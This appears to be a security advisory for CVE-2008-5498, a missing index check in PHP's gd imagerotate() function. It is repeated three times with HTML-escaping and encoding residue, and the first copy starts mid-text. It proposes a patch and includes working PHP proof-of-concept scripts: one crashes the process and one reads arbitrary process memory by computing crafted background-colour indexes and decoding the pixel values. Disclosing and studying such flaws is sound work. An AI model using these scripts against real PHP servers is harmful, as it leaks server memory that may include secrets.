NULL) { \r\n3135:       returnNULL; \r\n3136: }\r\n3137:+\r\n3137:+ // Index check\r\n3137:+ if (!src-&#62;truecolor) \r\n3137:+ clrBack &= 0xff; // Just keep the first byte\r\n3137:+\r\n3138: if(!gdImageTrueColor(src) && clrBack&#62;=gdImageColorsTotal(src)) { \r\n3139:       returnNULL; \r\n3140: }\r\n\r\nWhile rotating indexed image, gd retrives the final backcolor from 4 parallel arrays(red, green, blue and alpha) with length of 255 and uses clrBack as the indexof these arrays.\r\nBy providing a special clrBack value (more than 255) we can read almost any address in php memory:\r\n\r\nfile: php-x.y.z/ext/gd/libgd/gd.h\r\n\r\ntypedef struct gdImageStruct { \r\n \r\n      --snip snip --   \r\n \r\n      intred[gdMaxColors]; \r\n      intgreen[gdMaxColors]; \r\n      intblue[gdMaxColors]; \r\n \r\n      --snip snip --   \r\n \r\n      intalpha[gdMaxColors]; \r\n      /*Truecolor flag and pixels. New 2.0 fields appear here at the \r\n            endto minimize breakage of existing object code. */ \r\n      inttrueColor; \r\n      \r\n      --snip snip --   \r\n \r\n} gdImage; \r\n\r\ntypedef gdImage * gdImagePtr; \r\n\r\nthen uses gdTrueColorAlpha macro to combinethe 4 mentioned values. gdTrueColorAlpha macro  is implemented as following: \r\n\r\nfile: php-x.y.z/ext/gd/libgd/gd.h\r\n\r\n#define gdTrueColorAlpha(r, g, b, a) (((a)&#60;&#60; 24) + \\\r\n      ((r)&#60;&#60; 16) + \\\r\n      ((g)&#60;&#60; 8) + \\\r\n      (b))\r\n\r\nThe final color value is the output of gdTrueColorAlpha macro which will be used as background color. gdTrueColorAlpha uses &#39;+&#39; (add) instead of &#39;&&#39;(and). While the &#39;+&#39; operator is slower, it also causes a security issue. By using a reverse function we can calculate almost any desired memory address.\r\n\r\nProof of concept:\r\nThis script would cause a segmentation faultbecause -9999999 would result in reading an invalid memory address in PHP process:\r\n\r\n&#60;?php\r\n\r\n$img = imagecreate(5,5);\r\n$tmp = imagerotate ($img,5,-9999999);\r\n\r\n?&#62;\r\nExploitation  :\r\nWe need to provide a good clrBack to imageRotate()and then calculate the value of desired memory address by using imagecolorat() with arguments concerned with angles of the rotated image. Upper right would be a good spot (0, 0):\r\n\r\n&#60;?php \r\n&special_index = /* index of the$address */\r\n$r=imagecreate(300,300); \r\n$gray = imagecolorallocate( $r,111,111,111); \r\nimagefilledrectangle($r,0,0,300,300,$gray);\r\n$tmp =imagerotate( $r, 30,&special_index ); \r\nimagePng( $tmp, &#34;test.png&#34; ); \r\n?&#62;\r\n\r\n\r\n --------\r\n|f_b/\\\t |\r\n|  /  \\\t |\r\n| /    \\ |\r\n|/image\t\\|\r\n|\\      /|\r\n| \\    / |\r\n|  \\  /\t |\r\n|   \\/\t |\r\n --------\r\n\r\nTo read encoded memory values from a desired address,  we have to use the following script:\r\n\r\n&#60;?php\r\n\r\n$address = /*address to read should bemultiply of 4 */\r\n$src = 0x84cde2c; \r\n// depends on the image size and phpscript length but is constant\r\n$index_b = -(int)(($src - $address +0x810)/4);\r\n\r\n$img = imagecreate(5,5);\r\n$tmp = imagerotate ($img,5,$index_b);\r\n$f_b = imagecolorat( $tmp,0,0);\r\n\r\n?&#62;\r\n\r\nAfter passing $index_b as the index of arrays (red, green, blue and alphaarrays) and  rotating $img (so that the values from the memory would be read), b variable takes the value of $address.\r\nThe color at [0,0] would be filled by back color,thus $f_b has the return value of gdTrueColorAlpha function. All we need to do is decoding its value. The final value of $f_b is calculated as following:\r\n$f_b =  gdTrueColorAlpha( M[$address-512],\r\n                          M[$address-255],\r\n                          M[$address+0],\r\n                          M[$address+1034]);\r\n\r\nThese offsets [-512, -255, 0, 1034] are the displacements in gdImageStruct&#39;s arrays.\r\nDecoding $f_b\r\nAs you can see in the source code $f_b is calculated like this:\r\n----------------------------------------------------------\r\na\t:A4\tA3\tA2\tA1\r\nr\t:\tR4\tR3\tR2\tR1\r\ng\t:\t\tG4\tG3\tG2\tG1\r\nb\t:\t\t\tB4\tB3\tB2\tB1\r\n----------------------------------------------------------\r\n$f_b\t:\t\t\tF4\tF3\tF2\tF1\r\n----------------------------------------------------------\r\n\r\nWe have used a special $index_b in order that b would have the value of memory address at $address. All we need to do is extracting b from $f_b. It is obvious that F1 has the exact value of B1( first byte of memory at $address location). To extract B2 we must have G1 values and use this equation: B2 = F2 \u0096 G1. \r\nTo calculate B3 and B4 we will also need G2, G3, R1, R2, A1. These bytes values can also be grabbed by using imagerotate function and sending special indexes other than $index_b.

(http://www.php-security.org/)\r\n\r\nVulnerableversion\r\nPHP &lt;= 5.2.8\r\nCVE Candidate Number: CVE-2008-5498\r\n\r\nVulnerability\r\nThe imageRotate() function does not perform any validation check on the clrBack parameter which is used as an index for the above mentioned arrays with the size of 255 in the index image type.\r\nA correct validation check for the indexed images could be:\r\n\r\nfile: php-x.y.z/ext/gd/libgd/gd.c\r\n\r\n3129: gdImagePtr gdImageRotate (gdImagePtrsrc, double dAngle,\r\n                                int clrBack, int ignoretransparent) \r\n3130:{ \r\n3131: gdImagePtrpMidImg; \r\n3132: gdImagePtrrotatedImg;\r\n3133:\r\n3134: if(src == NULL) { \r\n3135:       returnNULL; \r\n3136: }\r\n3137:+\r\n3137:+ // Index check\r\n3137:+ if (!src-&gt;truecolor) \r\n3137:+ clrBack &amp;= 0xff; // Just keep the first byte\r\n3137:+\r\n3138: if(!gdImageTrueColor(src) &amp;&amp; clrBack&gt;=gdImageColorsTotal(src)) { \r\n3139:       returnNULL; \r\n3140: }\r\n\r\nWhile rotating indexed image, gd retrives the final backcolor from 4 parallel arrays(red, green, blue and alpha) with length of 255 and uses clrBack as the indexof these arrays.\r\nBy providing a special clrBack value (more than 255) we can read almost any address in php memory:\r\n\r\nfile: php-x.y.z/ext/gd/libgd/gd.h\r\n\r\ntypedef struct gdImageStruct { \r\n \r\n      --snip snip --   \r\n \r\n      intred[gdMaxColors]; \r\n      intgreen[gdMaxColors]; \r\n      intblue[gdMaxColors]; \r\n \r\n      --snip snip --   \r\n \r\n      intalpha[gdMaxColors]; \r\n      /*Truecolor flag and pixels. New 2.0 fields appear here at the \r\n            endto minimize breakage of existing object code. */ \r\n      inttrueColor; \r\n      \r\n      --snip snip --   \r\n \r\n} gdImage; \r\n\r\ntypedef gdImage * gdImagePtr; \r\n\r\nthen uses gdTrueColorAlpha macro to combinethe 4 mentioned values. gdTrueColorAlpha macro  is implemented as following: \r\n\r\nfile: php-x.y.z/ext/gd/libgd/gd.h\r\n\r\n#define gdTrueColorAlpha(r, g, b, a) (((a)&lt;&lt; 24) + \\\r\n      ((r)&lt;&lt; 16) + \\\r\n      ((g)&lt;&lt; 8) + \\\r\n      (b))\r\n\r\nThe final color value is the output of gdTrueColorAlpha macro which will be used as background color. gdTrueColorAlpha uses '+' (add) instead of '&amp;'(and). While the '+' operator is slower, it also causes a security issue. By using a reverse function we can calculate almost any desired memory address.\r\n\r\nProof of concept:\r\nThis script would cause a segmentation faultbecause -9999999 would result in reading an invalid memory address in PHP process:\r\n\r\n&lt;?php\r\n\r\n$img = imagecreate(5,5);\r\n$tmp = imagerotate ($img,5,-9999999);\r\n\r\n?&gt;\r\nExploitation  :\r\nWe need to provide a good clrBack to imageRotate()and then calculate the value of desired memory address by using imagecolorat() with arguments concerned with angles of the rotated image. Upper right would be a good spot (0, 0):\r\n\r\n&lt;?php \r\n&amp;special_index = /* index of the$address */\r\n$r=imagecreate(300,300); \r\n$gray = imagecolorallocate( $r,111,111,111); \r\nimagefilledrectangle($r,0,0,300,300,$gray);\r\n$tmp =imagerotate( $r, 30,&amp;special_index ); \r\nimagePng( $tmp, &quot;test.png&quot; ); \r\n?&gt;\r\n\r\n\r\n --------\r\n|f_b/\\\t |\r\n|  /  \\\t |\r\n| /    \\ |\r\n|/image\t\\|\r\n|\\      /|\r\n| \\    / |\r\n|  \\  /\t |\r\n|   \\/\t |\r\n --------\r\n\r\nTo read encoded memory values from a desired address,  we have to use the following script:\r\n\r\n&lt;?php\r\n\r\n$address = /*address to read should bemultiply of 4 */\r\n$src = 0x84cde2c; \r\n// depends on the image size and phpscript length but is constant\r\n$index_b = -(int)(($src - $address +0x810)/4);\r\n\r\n$img = imagecreate(5,5);\r\n$tmp = imagerotate ($img,5,$index_b);\r\n$f_b = imagecolorat( $tmp,0,0);\r\n\r\n?&gt;\r\n\r\nAfter passing $index_b as the index of arrays (red, green, blue and alphaarrays) and  rotating $img (so that the values from the memory would be read), b variable takes the value of $address.\r\nThe color at [0,0] would be filled by back color,thus $f_b has the return value of gdTrueColorAlpha function. All we need to do is decoding its value. The final value of $f_b is calculated as following:\r\n$f_b =  gdTrueColorAlpha( M[$address-512],\r\n                          M[$address-255],\r\n                          M[$address+0],\r\n                          M[$address+1034]);\r\n\r\nThese offsets [-512, -255, 0, 1034] are the displacements in gdImageStruct's arrays.\r\nDecoding $f_b\r\nAs you can see in the source code $f_b is calculated like this:\r\n----------------------------------------------------------\r\na\t:A4\tA3\tA2\tA1\r\nr\t:\tR4\tR3\tR2\tR1\r\ng\t:\t\tG4\tG3\tG2\tG1\r\nb\t:\t\t\tB4\tB3\tB2\tB1\r\n----------------------------------------------------------\r\n$f_b\t:\t\t\tF4\tF3\tF2\tF1\r\n----------------------------------------------------------\r\n\r\nWe have used a special $index_b in order that b would have the value of memory address at $address. All we need to do is extracting b from $f_b. It is obvious that F1 has the exact value of B1( first byte of memory at $address location). To extract B2 we must have G1 values and use this equation: B2 = F2 \u0096 G1. \r\nTo calculate B3 and B4 we will also need G2, G3, R1, R2, A1. These bytes values can also be grabbed by using imagerotate function and sending special indexes other than $index_b.

(http://www.php-security.org/)\n\nVulnerableversion\nPHP <= 5.2.8\nCVE Candidate Number: CVE-2008-5498\n\nVulnerability\nThe imageRotate() function does not perform any validation check on the clrBack parameter which is used as an index for the above mentioned arrays with the size of 255 in the index image type.\nA correct validation check for the indexed images could be:\n\nfile: php-x.y.z/ext/gd/libgd/gd.c\n\n3129: gdImagePtr gdImageRotate (gdImagePtrsrc, double dAngle,\n                                int clrBack, int ignoretransparent) \n3130:{ \n3131: gdImagePtrpMidImg; \n3132: gdImagePtrrotatedImg;\n3133:\n3134: if(src == NULL) { \n3135:       returnNULL; \n3136: }\n3137:+\n3137:+ // Index check\n3137:+ if (!src->truecolor) \n3137:+ clrBack &= 0xff; // Just keep the first byte\n3137:+\n3138: if(!gdImageTrueColor(src) && clrBack>=gdImageColorsTotal(src)) { \n3139:       returnNULL; \n3140: }\n\nWhile rotating indexed image, gd retrives the final backcolor from 4 parallel arrays(red, green, blue and alpha) with length of 255 and uses clrBack as the indexof these arrays.\nBy providing a special clrBack value (more than 255) we can read almost any address in php memory:\n\nfile: php-x.y.z/ext/gd/libgd/gd.h\n\ntypedef struct gdImageStruct { \n \n      --snip snip --   \n \n      intred[gdMaxColors]; \n      intgreen[gdMaxColors]; \n      intblue[gdMaxColors]; \n \n      --snip snip --   \n \n      intalpha[gdMaxColors]; \n      /*Truecolor flag and pixels. New 2.0 fields appear here at the \n            endto minimize breakage of existing object code. */ \n      inttrueColor; \n      \n      --snip snip --   \n \n} gdImage; \n\ntypedef gdImage * gdImagePtr; \n\nthen uses gdTrueColorAlpha macro to combinethe 4 mentioned values. gdTrueColorAlpha macro  is implemented as following: \n\nfile: php-x.y.z/ext/gd/libgd/gd.h\n\n#define gdTrueColorAlpha(r, g, b, a) (((a)<< 24) + \\\n      ((r)<< 16) + \\\n      ((g)<< 8) + \\\n      (b))\n\nThe final color value is the output of gdTrueColorAlpha macro which will be used as background color. gdTrueColorAlpha uses '+' (add) instead of '&'(and). While the '+' operator is slower, it also causes a security issue. By using a reverse function we can calculate almost any desired memory address.\n\nProof of concept:\nThis script would cause a segmentation faultbecause -9999999 would result in reading an invalid memory address in PHP process:\n\n<?php\n\n$img = imagecreate(5,5);\n$tmp = imagerotate ($img,5,-9999999);\n\n?>\nExploitation  :\nWe need to provide a good clrBack to imageRotate()and then calculate the value of desired memory address by using imagecolorat() with arguments concerned with angles of the rotated image. Upper right would be a good spot (0, 0):\n\n<?php \n&special_index = /* index of the$address */\n$r=imagecreate(300,300); \n$gray = imagecolorallocate( $r,111,111,111); \nimagefilledrectangle($r,0,0,300,300,$gray);\n$tmp =imagerotate( $r, 30,&special_index ); \nimagePng( $tmp, \"test.png\" ); \n?>\n\n\n --------\n|f_b/\\\t |\n|  /  \\\t |\n| /    \\ |\n|/image\t\\|\n|\\      /|\n| \\    / |\n|  \\  /\t |\n|   \\/\t |\n --------\n\nTo read encoded memory values from a desired address,  we have to use the following script:\n\n<?php\n\n$address = /*address to read should bemultiply of 4 */\n$src = 0x84cde2c; \n// depends on the image size and phpscript length but is constant\n$index_b = -(int)(($src - $address +0x810)/4);\n\n$img = imagecreate(5,5);\n$tmp = imagerotate ($img,5,$index_b);\n$f_b = imagecolorat( $tmp,0,0);\n\n?>\n\nAfter passing $index_b as the index of arrays (red, green, blue and alphaarrays) and  rotating $img (so that the values from the memory would be read), b variable takes the value of $address.\nThe color at [0,0] would be filled by back color,thus $f_b has the return value of gdTrueColorAlpha function. All we need to do is decoding its value. The final value of $f_b is calculated as following:\n$f_b =  gdTrueColorAlpha( M[$address-512],\n                          M[$address-255],\n                          M[$address+0],\n                          M[$address+1034]);\n\nThese offsets [-512, -255, 0, 1034] are the displacements in gdImageStruct's arrays.\nDecoding $f_b\nAs you can see in the source code $f_b is calculated like this:\n----------------------------------------------------------\na\t:A4\tA3\tA2\tA1\nr\t:\tR4\tR3\tR2\tR1\ng\t:\t\tG4\tG3\tG2\tG1\nb\t:\t\t\tB4\tB3\tB2\tB1\n----------------------------------------------------------\n$f_b\t:\t\t\tF4\tF3\tF2\tF1\n----------------------------------------------------------\n\nWe have used a special $index_b in order that b would have the value of memory address at $address. All we need to do is extracting b from $f_b. It is obvious that F1 has the exact value of B1( first byte of memory at $address location). To extract B2 we must have G1 values and use this equation: B2 = F2 \u0102\u0082\u00e2\u0080\u0093 G1. \nTo calculate B3 and B4 we will also need G2, G3, R1, R2, A1. These bytes values can also be grabbed by using imagerotate function and sending special indexes other than $index_b.
